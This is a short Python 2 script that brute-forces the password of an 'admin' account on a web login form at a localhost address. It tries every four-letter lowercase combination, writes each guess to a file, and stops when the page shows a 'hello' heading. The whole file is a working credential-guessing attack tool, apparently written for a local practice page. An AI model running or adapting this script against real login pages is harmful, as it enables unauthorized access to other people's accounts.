import itertools
import mechanize
from bs4 import BeautifulSoup
br = mechanize.Browser() 

comb = itertools.product(list("abcdefghijklmnopqrstuvwxyz"),repeat=4)

f = open("testfile.txt","w")
for i in comb:
	br = mechanize.Browser() 
	response = br.open('http://localhost/sample/log.php') 
	br.select_form(nr=0) 
	br.form['user'] = "admin"
	br.form['pass'] = ''.join(i)
	req = br.submit()
	req
	soup = BeautifulSoup(req.read(),'lxml')
	
	print ''.join(i)
	f.write(''.join(i))
	f.write('\n')
	if soup.findAll('h2')[0].text == "hello":
		print "Password found " + ''.join(i)
		break
	else:
		continue


